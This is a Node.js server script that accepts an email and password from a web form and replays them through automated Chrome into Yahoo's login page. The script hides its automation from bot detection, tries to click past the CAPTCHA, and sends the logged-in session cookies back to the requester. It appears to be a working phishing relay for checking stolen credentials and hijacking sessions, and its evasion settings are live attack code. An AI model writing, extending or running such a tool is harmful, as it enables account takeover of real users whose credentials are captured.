const express = require('express');
const bodyParser = require('body-parser');
const { Builder, By } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
//const stealth = require('selenium-stealth');



const app = express();
const port = 2000;


// Set up middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));


// Serve the HTML page with the form
app.get('/', (req, res) => {
    //res.sendFile(__dirName+'/index.html');
    const path = require('path');
    res.sendFile('index.html', { root: path.join(__dirname, 'pages') }); 
 });


 // Handle form submission
app.post('/submit', async (req, res) => {
    const { em, ps } = req.body;
  
    let chromeOptions = new chrome.Options();

  // Add user-agent and other Chrome options to mimic a real user
  chromeOptions.addArguments("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36");
  chromeOptions.addArguments("--disable-blink-features=AutomationControlled");
  chromeOptions.addArguments("--disable-extensions");

  chromeOptions.addArguments("--start-maximized"); // Start with the browser maximized
  chromeOptions.addArguments("--no-sandbox"); // Disabling the sandbox for Chrome's renderer processes
  chromeOptions.addArguments("--disable-dev-shm-usage"); // Overcome limited resource problems


  // Create a new WebDriver instance
  let driver = await new Builder()
  .withCapabilities({
      'goog:chromeOptions': {
          excludeSwitches: [
              'enable-automation',
              'useAutomationExtension',
          ],
      },
  })
    .forBrowser('chrome')
    .setChromeOptions(chromeOptions)
    .build();

  

   await driver.executeScript("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})");

    try {
      // Navigate to the website and perform actions
      await driver.get('https://login.yahoo.com'); // Replace with your target website
      await driver.findElement(By.id('login-username')).sendKeys(em); // Adjust the selector
      await driver.sleep(2000);
    //  await driver.findElement(By.name('searchField2')).sendKeys(keyword2); // Adjust the selector
      await driver.findElement(By.id('login-signin')).click(); // Adjust the selector
      await driver.sleep(2000);
    
       // Wait for 300 milliseconds
     // Wait for either the error element to be located or the URL to change
     await driver.sleep(7000);


     //await driver.wait(async () => {
     
      const errorElement = await driver.findElements(By.id('username-error'));
      //const errorElement = await driver.findElements(By.id('username-error'));Prove you're not a robot
      const waitCheck = await driver.findElements(By.id('wait-challenge'));
      
      
      const currentUrl = await driver.getCurrentUrl();
      //Happens after email has been entered
     if (errorElement.length > 0) {
          let err =  await errorElement[0].getText();
          res.status(202).send(err); 
          console.log('Email does not exist'+err);
          await driver.quit();
          
          return true;
      }else if (currentUrl !== 'https://login.yahoo.com/') { // replace with your page URL
          //checking if it displaeys password or captcha

          const errorElement_ = await driver.findElements(By.className('challenge password-challenge'));
          //const errorElement = await driver.findElements(By.id('username-error'));Prove you're not a robot
          const waitCheck_ = await driver.findElements(By.id('wait-challenge'));
          
        //  const currentUrl = await driver.getCurrentUrl();
    
         if (errorElement_.length > 0) {
                await driver.sleep(2000);
                await driver.findElement(By.id('login-passwd')).sendKeys(ps); // Adjust the selector
                await driver.sleep(1000);
              //  await driver.findElement(By.name('searchField2')).sendKeys(keyword2); // Adjust the selector
                await driver.findElement(By.id('login-signin')).click(); // Adjust the selector
                await driver.sleep(2000);
                console.log('Entered amd submitted password1');

                //extract cookies
                driver.manage().getCookies().then(function(cookies) {
                  console.log(cookies);
                  res.status(202).send(cookies); 
                });
                
              
                // Wait for 300 milliseconds
              // Wait for either the error element to be located or the URL to change
                await driver.sleep(7000);
                }else if (waitCheck_.length > 0) {
                  res.status(202).send('Server is waiting2'); 
                  console.log('Server is waiting2');
                  await driver.quit();
                }else{
                  await driver.sleep(7000);
                  await driver.findElement(By.id('g-recaptcha')).click();
                  console.log('clicked captcha');
                  await driver.sleep(1700);
                  await driver.findElements(By.id('recaptcha-submit'));
                  console.log('submitted captcha');
        
                  await driver.sleep(1500);
                  await driver.findElement(By.id('login-passwd')).sendKeys(ps); // Adjust the selector
                  await driver.sleep(1000);
                //  await driver.findElement(By.name('searchField2')).sendKeys(keyword2); // Adjust the selector
                  await driver.findElement(By.id('login-signin')).click(); // Adjust the selector
                  await driver.sleep(2000);
                  console.log('Entered amd submitted password2');


                  //extract cookies
                  driver.manage().getCookies().then(function(cookies) {
                    console.log(cookies);
                    res.status(202).send(cookies); 
                  });
                  
                  
                  
                  // Wait for 300 milliseconds
                // Wait for either the error element to be located or the URL to change
                  await driver.sleep(7000);
                }



          return true;
      }else if (waitCheck.length > 0) {
        res.status(202).send('Server is waiting'); 
        console.log('Server is waiting');
        await driver.quit();
      }
      //return false;
 // }, 10000); 
  
      // Simple response to acknowledge completion
    } finally {
      //await driver.quit();
    }
  });

  app.listen(port, () => {
    console.log(`Server running on port ${port}`);
  });